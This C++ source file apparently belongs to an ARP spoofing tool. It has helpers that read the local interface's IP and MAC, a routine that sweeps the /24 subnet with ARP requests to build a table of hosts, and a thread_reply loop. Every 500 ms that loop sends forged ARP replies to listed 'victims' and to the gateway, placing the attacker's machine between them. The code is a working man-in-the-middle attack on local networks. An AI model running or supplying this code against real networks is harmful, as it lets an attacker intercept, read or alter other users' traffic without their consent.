#include "utils.hpp"

using namespace std;

// vector<unsigned char> str2mac(const char *txt, vector<unsigned char> mac){
//     sscanf(txt, "%hhx:%hhx:%hhx:%hhx:%hhx:%hhx", &mac[0], &mac[1], &mac[2], &mac[3], &mac[4], &mac[5]);
//     return mac;
// }
void str2mac(const char *txt, unsigned char *mac){
    sscanf(txt, "%hhx:%hhx:%hhx:%hhx:%hhx:%hhx", &mac[0], &mac[1], &mac[2], &mac[3], &mac[4], &mac[5]);
    return;
}

/*
 * Converts struct sockaddr with an IPv4 address to network byte order uin32_t.
 * Returns 0 on success.
 */
int int_ip4(struct sockaddr *addr, uint32_t *ip)
{
    if (addr->sa_family == AF_INET) {
        struct sockaddr_in *i = (struct sockaddr_in *) addr;
        *ip = i->sin_addr.s_addr;
        return 0;
    } else {
        err("Not AF_INET");
        return 1;
    }
}

/*
 * Formats sockaddr containing IPv4 address as human readable string.
 * Returns 0 on success.
 */
int format_ip4(struct sockaddr *addr, char *out)
{
    if (addr->sa_family == AF_INET) {
        struct sockaddr_in *i = (struct sockaddr_in *) addr;
        const char *ip = inet_ntoa(i->sin_addr);
        if (!ip) {
            return -2;
        } else {
            strcpy(out, ip);
            return 0;
        }
    } else {
        return -1;
    }
}

/*
 * Writes interface IPv4 address as network byte order to ip.
 * Returns 0 on success.
 */
int get_if_ip4(int fd, const char *ifname, uint32_t *ip) {
    int err = -1;
    struct ifreq ifr;
    memset(&ifr, 0, sizeof(struct ifreq));
    if (strlen(ifname) > (IFNAMSIZ - 1)) {
        err("Too long interface name");
        goto out;
    }

    strcpy(ifr.ifr_name, ifname);
    if (ioctl(fd, SIOCGIFADDR, &ifr) == -1) {
        perror("SIOCGIFADDR");
        goto out;
    }

    if (int_ip4(&ifr.ifr_addr, ip)) {
        goto out;
    }
    err = 0;
out:
    return err;
}

/*
 * Sends an ARP who-has request to dst_ip
 * on interface ifindex, using source mac src_mac and source ip src_ip.
 */
int send_arp(int fd, int ifindex, const unsigned char *src_mac, uint32_t src_ip, uint32_t dst_ip)
{
    int err = -1;
    unsigned char buffer[BUF_SIZE];
    memset(buffer, 0, sizeof(buffer));

    struct sockaddr_ll socket_address;
    socket_address.sll_family = AF_PACKET;
    socket_address.sll_protocol = htons(ETH_P_ARP);
    socket_address.sll_ifindex = ifindex;
    socket_address.sll_hatype = htons(ARPHRD_ETHER);
    socket_address.sll_pkttype = (PACKET_BROADCAST);
    socket_address.sll_halen = MAC_LENGTH;
    socket_address.sll_addr[6] = 0x00;
    socket_address.sll_addr[7] = 0x00;

    struct ethhdr *send_req = (struct ethhdr *) buffer;
    struct arp_header *arp_req = (struct arp_header *) (buffer + ETH2_HEADER_LEN);
    //int index;
    ssize_t ret;

    //Broadcast
    memset(send_req->h_dest, 0xff, MAC_LENGTH);

    //Target MAC zero
    memset(arp_req->target_mac, 0x00, MAC_LENGTH);

    //Set source mac to our MAC address
    memcpy(send_req->h_source, src_mac, MAC_LENGTH);
    memcpy(arp_req->sender_mac, src_mac, MAC_LENGTH);
    memcpy(socket_address.sll_addr, src_mac, MAC_LENGTH);

    /* Setting protocol of the packet */
    // 0x0806 for ARP
    send_req->h_proto = htons(ETH_P_ARP);

    /* Creating ARP request */
    arp_req->htype = htons(HW_TYPE);
    arp_req->ptype = htons(ETH_P_IP);
    arp_req->hlen = MAC_LENGTH;
    arp_req->plen = IPV4_LENGTH;
    arp_req->opcode = htons(ARP_REQUEST);

    //debug("Copy IP address to arp_req");
    memcpy(arp_req->sender_ip, &src_ip, sizeof(uint32_t));
    memcpy(arp_req->target_ip, &dst_ip, sizeof(uint32_t));

    ret = sendto(fd, buffer, 42, 0, (struct sockaddr *) &socket_address, sizeof(socket_address));
    if (ret == -1) {
        perror("sendto():");
        goto out;
    }
    err = 0;
out:
    return err;
}

int arp_reply(int ifindex, unsigned char *src_mac, unsigned char *dst_mac, uint32_t src_ip, uint32_t dst_ip){
    int fd;
    bind_arp(ifindex, &fd);
    
    unsigned char buffer[BUF_SIZE];
    memset(buffer, 0, sizeof(buffer));

    struct sockaddr_ll socket_address;
    socket_address.sll_family = AF_PACKET;
    socket_address.sll_protocol = htons(ETH_P_ARP);
    socket_address.sll_ifindex = ifindex;
    socket_address.sll_hatype = htons(ARPHRD_ETHER);
    socket_address.sll_pkttype = (PACKET_HOST);
    socket_address.sll_halen = MAC_LENGTH;
    socket_address.sll_addr[6] = 0x00;
    socket_address.sll_addr[7] = 0x00;

    struct ethhdr *send_req = (struct ethhdr *) buffer;
    struct arp_header *arp_req = (struct arp_header *) (buffer + ETH2_HEADER_LEN);
    ssize_t ret;

    //destination MAC
    memcpy(send_req->h_dest, dst_mac, MAC_LENGTH);
    memcpy(arp_req->target_mac, dst_mac, MAC_LENGTH);

    //Set source mac to our MAC address
    memcpy(send_req->h_source, src_mac, MAC_LENGTH);
    memcpy(arp_req->sender_mac, src_mac, MAC_LENGTH);
    memcpy(socket_address.sll_addr, src_mac, MAC_LENGTH);

    /* Setting protocol of the packet */
    // 0x0806 for ARP
    send_req->h_proto = htons(ETH_P_ARP);

    /* Creating ARP request */
    arp_req->htype = htons(HW_TYPE);
    arp_req->ptype = htons(ETH_P_IP);
    arp_req->hlen = MAC_LENGTH;
    arp_req->plen = IPV4_LENGTH;
    arp_req->opcode = htons(ARP_REPLY);

    //debug("Copy IP address to arp_req");
    memcpy(arp_req->sender_ip, &src_ip, sizeof(uint32_t));
    memcpy(arp_req->target_ip, &dst_ip, sizeof(uint32_t));

    ret = sendto(fd, buffer, 42, 0, (struct sockaddr *) &socket_address, sizeof(socket_address));
    close(fd);
    return ret;
}

void thread_reply(const char *ifname, vector<string> vctms, map<string, string> arp_table, unsigned char *gw_mac, uint32_t gw_ip){
    uint32_t my_ip;
    int ifidx;
    unsigned char my_mac[6];
    get_if_info(ifname, &my_ip, my_mac, &ifidx);

    while(true){
        unsigned char *vctm_mac = new unsigned char[6];
        for(uint i = 0; i < vctms.size(); i++){
            str2mac(arp_table[vctms[i]].c_str(), vctm_mac);
            // to victims
            arp_reply(ifidx, my_mac, vctm_mac, gw_ip, inet_addr(vctms[i].c_str()));
            // to gateway
            arp_reply(ifidx, my_mac, gw_mac, inet_addr(vctms[i].c_str()), gw_ip);
        }
        //free(vctm_mac);
        // sending every 500ms
        this_thread::sleep_for(chrono::milliseconds(500));
    }
}

// void thread_reply(int ifindex, unsigned char *src_mac, unsigned char *dst_mac, uint32_t src_ip, uint32_t dst_ip){
//     while(true){
//         arp_reply(ifindex, src_mac, dst_mac, src_ip, dst_ip);
//         // sending every 500ms
//         this_thread::sleep_for(chrono::milliseconds(500));
//     }
// }

/*
 * Gets interface information by name:
 * IPv4
 * MAC
 * ifindex
 */
int get_if_info(const char *ifname, uint32_t *ip, unsigned char *mac, int *ifindex)
{
    //debug("get_if_info for %s", ifname);
    int err = -1;
    struct ifreq ifr;
    int sd = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ARP));
    if (sd <= 0) {
        perror("socket()");
        goto out;
    }
    if (strlen(ifname) > (IFNAMSIZ - 1)) {
        printf("Too long interface name, MAX=%i\n", IFNAMSIZ - 1);
        goto out;
    }

    strcpy(ifr.ifr_name, ifname);

    //Get interface index using name
    if (ioctl(sd, SIOCGIFINDEX, &ifr) == -1) {
        perror("SIOCGIFINDEX");
        goto out;
    }
    *ifindex = ifr.ifr_ifindex;
    //printf("interface index is %d\n", *ifindex);

    //Get MAC address of the interface
    if (ioctl(sd, SIOCGIFHWADDR, &ifr) == -1) {
        perror("SIOCGIFINDEX");
        goto out;
    }

    //Copy mac address to output
    memcpy(mac, ifr.ifr_hwaddr.sa_data, MAC_LENGTH);

    if (get_if_ip4(sd, ifname, ip)) {
        goto out;
    }
    //debug("get_if_info OK");

    err = 0;
out:
    if (sd > 0) {
        //debug("Clean up temporary socket");
        close(sd);
    }
    return err;
}

/*
 * Creates a raw socket that listens for ARP traffic on specific ifindex.
 * Writes out the socket's FD.
 * Return 0 on success.
 */
int bind_arp(int ifindex, int *fd)
{
    //debug("bind_arp: ifindex=%i", ifindex);
    int ret = -1;

    // Submit request for a raw socket descriptor.
    *fd = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ARP));
    if (*fd < 1) {
        perror("socket()");
        goto out;
    }

    //debug("Binding to ifindex %i", ifindex);
    struct sockaddr_ll sll;
    memset(&sll, 0, sizeof(struct sockaddr_ll));
    sll.sll_family = AF_PACKET;
    sll.sll_ifindex = ifindex;
    if (bind(*fd, (struct sockaddr*) &sll, sizeof(struct sockaddr_ll)) < 0) {
        perror("bind");
        goto out;
    }

    ret = 0;
out:
    if (ret && *fd > 0) {
        debug("Cleanup socket");
        close(*fd);
    }
    return ret;
}

/*
 * Reads a single ARP reply from fd.
 * Return 0 on success.
 */
int read_arp(int fd, map<string, string> &arp_table)
{
    //debug("read_arp");
    struct timeval timeout = {0, 300};
    if(setsockopt(fd, SOL_SOCKET, SO_RCVTIMEO, (const char*)&timeout, sizeof(timeout)) < 0){
        perror("setsockopt()");
        return -1;
    }

    int ret = -1;
    unsigned char buffer[BUF_SIZE];
    ssize_t length = recvfrom(fd, buffer, BUF_SIZE, 0, NULL, NULL);
    //int index;
    if (length == -1) {
        if (errno == EAGAIN || errno == EWOULDBLOCK) {
            return -50;
            //debug("Timeout");
            //goto out;
        }
        perror("recvfrom()");
        //goto out;
    }
    struct ethhdr *rcv_resp = (struct ethhdr *) buffer;
    struct arp_header *arp_resp = (struct arp_header *) (buffer + ETH2_HEADER_LEN);
    if (ntohs(rcv_resp->h_proto) != PROTO_ARP) {
        debug("Not an ARP packet");
        //goto out;
    }
    if (ntohs(arp_resp->opcode) != ARP_REPLY) {
        debug("Not an ARP reply");
        //goto out;
    }
    struct in_addr sender_a;
    memset(&sender_a, 0, sizeof(struct in_addr));
    memcpy(&sender_a.s_addr, arp_resp->sender_ip, sizeof(uint32_t));
    //debug("Sender IP: %s", inet_ntoa(sender_a));
    //cout << inet_ntoa(sender_a) << '\t';
    char dst_mac[18];
    sprintf(dst_mac, "%02X:%02X:%02X:%02X:%02X:%02X",
            arp_resp->sender_mac[0],
            arp_resp->sender_mac[1],
            arp_resp->sender_mac[2],
            arp_resp->sender_mac[3],
            arp_resp->sender_mac[4],
            arp_resp->sender_mac[5]);
    //cout << dst_mac << '\n';

    char *ip = inet_ntoa(sender_a);
    arp_table[ip] = dst_mac;

    ret = 0;

out:
    return ret;
}

/*
 *
 * Sample code that sends an ARP who-has request on
 * interface <ifname> to IPv4 address <ip>.
 * Returns 0 on success.
 */
int test_arp(const char *ifname, uint32_t ip, map<string, string> &arp_table) {
    int ret = -1;
    uint32_t dst = ip;
    if (dst == 0 || dst == 0xffffffff) {
        printf("Invalid source IP\n");
        return 1;
    }

    uint32_t src;
    int ifindex;
    unsigned char mac[MAC_LENGTH];
    if (get_if_info(ifname, &src, mac, &ifindex)) {
        err("get_if_info failed, interface %s not found or no IP set?", ifname);
        goto out;
    }
    int arp_fd;
    if (bind_arp(ifindex, &arp_fd)) {
        err("Failed to bind_arp()");
        goto out;
    }

    for(int i=1;i<255;i++){
        // get subnet /24
        dst = dst & 0x00FFFFFF;
        dst = dst | (i << 24);
        // ignore myself
        if(src == dst) continue;
        if (send_arp(arp_fd, ifindex, mac, src, dst)) {
            err("Failed to send_arp");
            goto out;
        }
    }

    while(1) {
        int r = read_arp(arp_fd, arp_table);
        // if timeout
        if(r == -50){
            break;
        }
    }

    ret = 0;
out:
    if (arp_fd) {
        close(arp_fd);
        arp_fd = 0;
    }
    return ret;
}

